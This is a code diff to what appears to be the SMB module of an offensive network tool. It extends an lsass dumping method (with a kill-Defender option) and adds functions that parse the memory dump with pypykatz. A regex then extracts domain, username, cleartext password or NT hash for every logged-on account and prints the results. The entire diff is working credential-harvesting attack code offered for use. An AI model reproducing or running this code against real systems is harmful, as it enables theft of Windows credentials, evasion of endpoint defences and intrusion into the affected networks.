@@ -41,6 +41,7 @@ from cmx.protocols.smb.EXECMETHODS.wmiexec import WMIEXEC as cmxWMIEXEC
 from cmx.servers.smb import CMXSMBServer
 
 
+
 #################################################################################################
 #################################################################################################
 
@@ -483,7 +484,6 @@ class smb(connection):
     def dump(self):
         """Procdump lsass."""
 
-        
         if self.args.kd:
             killDefender = True
         else:
@@ -499,9 +499,64 @@ class smb(connection):
             return
 
         try:
-            exec_method.dump()
+            dumpFile = exec_method.dump()
         except Exception as e:
             logging.debug('dump failed because: {}'.format(str(e)))
+        self.parsedump(dumpFile)
+
+
+
+    def parsedump(self, dumpfile):
+        # Inspiration by @HackAndDo aka Pixis for these parse bits
+        from pypykatz.pypykatz import pypykatz
+        from pypykatz.lsadecryptor.cmdhelper import LSACMDHelper
+        from contextlib import redirect_stdout
+        import io
+
+
+        # hacky BS cause i'm dumb
+        class dum( object ):
+            pass
+
+        arg = dum()
+        setattr(arg, 'outfile', False)
+        setattr(arg, 'json', False)
+        setattr(arg, 'grep', False)
+        setattr(arg, 'kerberos_dir', False)
+        setattr(arg, 'recursive', False)
+        setattr(arg, 'directory', False)
+
+
+        out = pypykatz.parse_minidump_file(dumpfile)
+
+        f = io.StringIO()
+        with redirect_stdout(f): # Hides output
+            LSACMDHelper().process_results({"dumpfile": out}, [], arg)
+
+        credentials = self.parse_output(f.getvalue())
+
+        self.logger.highlight("Results:")
+        for credential in credentials:
+            self.logger.highlight("        %s\\%s:%s" % credential)
+
+
+    def parse_output(self, output):
+        import re
+        regex = r"(?:username:? (?!NA)(?P<username>.+)\n.*domain(?:name)?:? (?P<domain>.+)\n)(?:.*password:? (?!None)(?P<password>.+)|.*\n.*NT: (?P<hash>.*))"
+        matches = re.finditer(regex, output, re.MULTILINE | re.IGNORECASE)
+        credentials= []
+        for match in matches:
+            domain = match.group("domain")
+            username = match.group("username")
+            password = match.group("password") or match.group("hash")
+            if len(password) > 128:
+                # its not a password or hash, probably a kerb pass
+                pass
+            else:
+                credentials.append((domain, username, password))
+        return set(credentials)
+
+
 
 
 ###############################################################################
